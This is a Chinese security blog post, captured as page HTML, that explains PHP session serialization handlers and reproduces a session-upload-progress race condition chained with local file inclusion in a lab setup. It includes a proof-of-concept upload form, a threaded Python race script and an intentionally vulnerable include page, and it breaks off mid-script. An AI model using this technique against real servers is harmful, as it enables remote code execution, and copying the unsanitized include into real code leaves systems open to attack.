@@ -1,0 +1,631 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png">
+  <link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.loli.net/css?family=Lato:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.1/css/all.min.css" integrity="sha256-Z1K5uhUaJXA7Ll0XrZ/0JhX4lAtZFpT6jkKrEDT0drU=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"x2658y.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.14.1","exturl":false,"sidebar":{"position":"right","display":"post","padding":128,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":false,"color":"#222","save":"manual"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"disqus","storage":true,"lazyload":true,"nav":null,"activeClass":"disqus"},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="PHP的序列化处理器 PHP的序列化处理器有三种  php 12345678&lt;?php     ini_set(&amp;#x27;session.serialize_handler&amp;#x27;,&amp;#x27;php&amp;#x27;);    session_start();    $_SESSION[&quot;abc&quot;] &#x3D; 123;    $_SESSION[&quot;qwe&amp;q">
+<meta property="og:type" content="blog">
+<meta property="og:title" content="关于PHP_SESSION的漏洞利用及复现">
+<meta property="og:url" content="https://x2658y.github.io/2023/04/05/[Web]%E5%85%B3%E4%BA%8EPHP_SESSION%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%8F%8A%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:site_name" content="x2658y&#39;s Blog">
+<meta property="og:description" content="PHP的序列化处理器 PHP的序列化处理器有三种  php 12345678&lt;?php     ini_set(&amp;#x27;session.serialize_handler&amp;#x27;,&amp;#x27;php&amp;#x27;);    session_start();    $_SESSION[&quot;abc&quot;] &#x3D; 123;    $_SESSION[&quot;qwe&amp;q">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/x2658y/static/master/images/202304051654355.png">
+<meta property="article:published_time" content="2023-04-05T07:16:32.000Z">
+<meta property="article:modified_time" content="2023-04-07T02:56:58.111Z">
+<meta property="article:author" content="x2658y">
+<meta property="article:tag" content="Web安全">
+<meta property="article:tag" content="PHP">
+<meta property="article:tag" content="PHP反序列化">
+<meta property="article:tag" content="PHP_SESSION">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/x2658y/static/master/images/202304051654355.png">
+
+
+<link rel="canonical" href="https://x2658y.github.io/2023/04/05/[Web]%E5%85%B3%E4%BA%8EPHP_SESSION%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%8F%8A%E5%A4%8D%E7%8E%B0/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://x2658y.github.io/2023/04/05/[Web]%E5%85%B3%E4%BA%8EPHP_SESSION%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%8F%8A%E5%A4%8D%E7%8E%B0/","path":"2023/04/05/[Web]关于PHP_SESSION的漏洞利用及复现/","title":"关于PHP_SESSION的漏洞利用及复现"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>关于PHP_SESSION的漏洞利用及复现 | x2658y's Blog</title>
+  
+
+
+
+  <script data-pjax defer src='https://static.cloudflareinsights.com/beacon.min.js' data-cf-beacon='{&quot;token&quot;: &quot;c951485d6ab947a09252683f3aef6346&quot;}'></script>
+
+
+
+  <script async defer data-website-id="" src=""></script>
+
+  <script defer data-domain="" src=""></script>
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">x2658y's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">杂七杂八的记事本</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">29</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">4</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">38</span></a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input" style="font-size:13px;vertical-align:middle;margin-top:5px">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#php%E7%9A%84%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%84%E7%90%86%E5%99%A8"><span class="nav-number">1.</span> <span class="nav-text">PHP的序列化处理器</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#php%E7%9A%84%E4%BC%9A%E8%AF%9D%E6%9C%BA%E5%88%B6"><span class="nav-number">2.</span> <span class="nav-text">PHP的会话机制</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B7%A5%E4%BD%9C%E6%96%B9%E5%BC%8F"><span class="nav-number">2.1.</span> <span class="nav-text">工作方式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#php_session_upload_progress"><span class="nav-number">2.2.</span> <span class="nav-text">PHP_SESSION_UPLOAD_PROGRESS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#php_session_upload_progress%E7%BB%93%E5%90%88lfi"><span class="nav-number">2.3.</span> <span class="nav-text">PHP_SESSION_UPLOAD_PROGRESS结合LFI</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="nav-number">3.</span> <span class="nav-text">反序列化漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%94%99%E8%AF%AF%E7%BB%84%E5%90%88%E4%B8%8D%E5%90%8C%E7%9A%84%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%84%E7%90%86%E5%99%A8%E5%AF%BC%E8%87%B4%E6%BC%8F%E6%B4%9E"><span class="nav-number">3.1.</span> <span class="nav-text">错误组合不同的序列化处理器导致漏洞</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="x2658y"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">x2658y</p>
+  <div class="site-description" itemprop="description">Stay hungry. Stay foolish.</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">38</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">29</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/x2658y" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;x2658y" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i></a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:x2658y@foxmail.com" title="E-Mail → mailto:x2658y@foxmail.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i></a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/x2658y" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;x2658y" rel="noopener me" target="_blank"><i class="fab fa-twitter fa-fw"></i></a>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/big/by_nc_sa.svg" alt="Creative Commons"></a>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://x2658y.github.io/2023/04/05/[Web]%E5%85%B3%E4%BA%8EPHP_SESSION%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%8F%8A%E5%A4%8D%E7%8E%B0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="x2658y">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="x2658y's Blog">
+      <meta itemprop="description" content="Stay hungry. Stay foolish.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="关于PHP_SESSION的漏洞利用及复现 | x2658y's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          关于PHP_SESSION的漏洞利用及复现
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2023-04-05 15:16:32" itemprop="dateCreated datePublished" datetime="2023-04-05T15:16:32+08:00">2023-04-05</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2023-04-07 10:56:58" itemprop="dateModified" datetime="2023-04-07T10:56:58+08:00">2023-04-07</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Web/" itemprop="url" rel="index"><span itemprop="name">Web</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>1.5k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>6 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h2 id="php的序列化处理器">PHP的序列化处理器</h2>
+<p><code>PHP</code>的序列化处理器有三种</p>
+<ul>
+<li><p><code>php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">session_start</span>();</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&quot;abc&quot;</span>] = <span class="number">123</span>;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&quot;qwe&quot;</span>] = <span class="number">789</span>;</span><br><span class="line">    <span class="comment">//查看session文件内容为</span></span><br><span class="line">    <span class="comment">//abc|i:123;qwe|i:789;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li>
+<li><p><code>php_serialize</code></p>
+<blockquote>
+<p>PHP Version &gt;= 5.5.4</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">session_start</span>();</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&quot;abc&quot;</span>] = <span class="number">123</span>;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&quot;qwe&quot;</span>] = <span class="number">789</span>;</span><br><span class="line">    <span class="comment">//查看session文件内容为</span></span><br><span class="line">    <span class="comment">//a:2:&#123;s:3:&quot;abc&quot;;i:123;s:3:&quot;qwe&quot;;i:789;&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li>
+<li><p><code>php_binary</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_binary&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">session_start</span>();</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&quot;abc&quot;</span>] = <span class="number">123</span>;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&quot;qwe&quot;</span>] = <span class="number">789</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><code>session</code>文件的内容如下<img
+src="https://raw.githubusercontent.com/x2658y/static/master/images/202304051732264.png"
+alt="image-20230405173209240" /></p></li>
+</ul>
+<p>以上三种序列化处理器的处理方式(<code>KEY</code>代表<code>$_SESSION</code>数组的键,
+比如<code>abc</code>):</p>
+<ul>
+<li><code>php</code>
+<ul>
+<li><code>KEY</code>+<code>|</code>+<code>serialize($_Session["KEY"])</code>+<code>;</code></li>
+</ul></li>
+<li><code>php_serialize</code>
+<ul>
+<li><code>serialize($_Session)</code></li>
+</ul></li>
+<li><code>php_binary</code>
+<ul>
+<li><code>char(len(KEY))</code>+<code>KEY</code>+<code>serialize("KEY")</code>+<code>;</code></li>
+</ul></li>
+</ul>
+<blockquote>
+<p>serialize()函数的序列化方式</p>
+<p>[TO BE CONTINUE...]</p>
+</blockquote>
+<h2 id="php的会话机制">PHP的会话机制</h2>
+<h3 id="工作方式">工作方式</h3>
+<p><code>PHP</code>采用<code>session</code>来保存与用户的会话信息,
+如果服务端开启了<code>session</code>(通过<code>session_start()</code>),
+当用户访问页面时, 服务端会返回名为<code>PHPSESSID</code>(默认值,
+取决于<code>session.name</code>)的<code>Cookie</code>.</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="comment">//session.php</span></span><br><span class="line">    <span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<figure>
+<img
+src="https://raw.githubusercontent.com/x2658y/static/master/images/202304051551481.png"
+alt="image-20230405155158450" />
+<figcaption aria-hidden="true">image-20230405155158450</figcaption>
+</figure>
+<p>并且会在<code>session</code>的储存目录(取决于<code>session.save_path</code>,
+我这里是<code>~/tmp/</code>,
+因为通过<code>docker</code>搭建的环境为了方便,
+所以映射到了宿主机的<code>~/mapping/tmp/</code>)下生成名为<code>sess_ + PHPSESSID</code>的文件</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/x2658y/static/master/images/202304051554166.png"
+alt="image-20230405155451142" />
+<figcaption aria-hidden="true">image-20230405155451142</figcaption>
+</figure>
+<p>服务端开启<code>session</code>,
+如果用户访问时没有携带<code>PHPSESSID</code>,
+服务端会生成一个<code>PHPSESSID</code>返回给用户,
+并创建一个<code>$_SESSION</code>的变量,
+服务端可以将和用户的会话信息存储在<code>$_SESSION</code>变量里,
+当本次请求执行完成时,
+<code>$_SESSION</code>变量将被序列化处理器(取决于<code>session.serialize_handler</code>)序列化后写入到<code>session</code>的储存目录中.
+当用户第二次访问时, 就会携带上<code>PHPSESSID</code>,
+服务端根据<code>PHPSESSID</code>找到对应的文件,
+通过反序列化处理器反序列化后将所得数据再次写回<code>$_SESSION</code>变量,
+实现会话的数据保存.</p>
+<p>测试:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="comment">//counter.php</span></span><br><span class="line">    <span class="title function_ invoke__">session_start</span>();</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&quot;count&quot;</span>]))</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&quot;count&quot;</span>] += <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&quot;count&quot;</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$_SESSION</span>[<span class="string">&quot;count&quot;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>连续访问15次, 浏览器依次显示1~15, 查看<code>session</code>文件</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/x2658y/static/master/images/202304062023525.png"
+alt="image-20230406202353502" />
+<figcaption aria-hidden="true">image-20230406202353502</figcaption>
+</figure>
+<p>如果服务端没有打开<code>session.use_strict_mode</code>(默认关闭),
+可以主动控制<code>PHPSESSID</code>的值,
+从而控制服务端<code>session</code>文件的名字,
+后面可以通过这个特点结合文件包含实现上传恶意代码.</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/x2658y/static/master/images/202304051655109.png"
+alt="image-20230405165505081" />
+<figcaption aria-hidden="true">image-20230405165505081</figcaption>
+</figure>
+<p><img src="https://raw.githubusercontent.com/x2658y/static/master/images/202304051654355.png" alt="image-20230405165443332" style="zoom: 80%;" /></p>
+<h3 id="php_session_upload_progress">PHP_SESSION_UPLOAD_PROGRESS</h3>
+<p>有时候, 服务端并没有开启<code>session</code>,
+这时候想通过常规方式往服务器写恶意的<code>session</code>文件就行不通了,
+但是通常情况下,
+服务器端默认开启了<code>session.upload_progress.enabled</code>这个选项.
+当这个选项开启时,
+无论服务端页面是否开启<code>session</code>(根据PHP文档的说法,
+这个功能的优先级在脚本执行之前),
+服务端都会生成<code>PHPSESSID</code>并将<code>$_SESSION</code>变量写入<code>session</code>储存目录.</p>
+<p>上传页面, <code>poc.html</code></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://vm-ubuntu.local/index.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>服务端页面, <code>index.php</code>, 为空就行 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">//Blank</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>随便上传个文件, 抓包添加一个<code>Cookie: PHPSESSID=123</code></p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/x2658y/static/master/images/202304062019121.png"
+alt="image-20230406201929068" />
+<figcaption aria-hidden="true">image-20230406201929068</figcaption>
+</figure>
+<p>看起来貌似什么也没发生,
+但是服务端实际上已经创建了一个名为<code>sess_123</code>的<code>session</code>的文件,
+然后迅速删掉了.</p>
+<p>写个脚本快速地上传, 产生竞争, 就可以看到服务器上的文件内容</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor, ALL_COMPLETED, wait</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pool = ThreadPoolExecutor(<span class="number">32</span>)</span><br><span class="line">task_list = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        url = <span class="string">&quot;http://vm-ubuntu.local/index.php&quot;</span></span><br><span class="line">        headers = &#123;<span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;PHPSESSID=123&quot;</span>&#125;</span><br><span class="line">        data = &#123;<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>: <span class="string">&quot;something&quot;</span>&#125;</span><br><span class="line">        files = &#123;<span class="string">&quot;file&quot;</span>: (<span class="string">&quot;blank.bin&quot;</span>, io.BytesIO(<span class="string">b&#x27;\xcc&#x27;</span>*<span class="number">1024</span>*<span class="number">1024</span>))&#125;</span><br><span class="line">        requests.post(url=url,</span><br><span class="line">                        headers=headers,</span><br><span class="line">                        data=data,</span><br><span class="line">                        files=files)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">     task_list.append(pool.submit(upload))</span><br><span class="line">wait(task_list, return_when=ALL_COMPLETED)</span><br></pre></td></tr></table></figure>
+<p><img
+src="https://raw.githubusercontent.com/x2658y/static/master/images/202304062021631.png"
+alt="image-20230406202133601" />可以发现, 可控内容的地方有很多处,
+只需要利用其中一处, 再和文件包含漏洞结合起来,
+就可以实现恶意代码执行.</p>
+<h3
+id="php_session_upload_progress结合lfi">PHP_SESSION_UPLOAD_PROGRESS结合LFI</h3>
+<p>先创建一个有本地文件包含漏洞的页面</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    <span class="comment">//lfi.php</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>]))</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>改造一下脚本, 使其能够通过竞争将恶意代码执行,
+前提是知道<code>session</code>的储存位置</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> 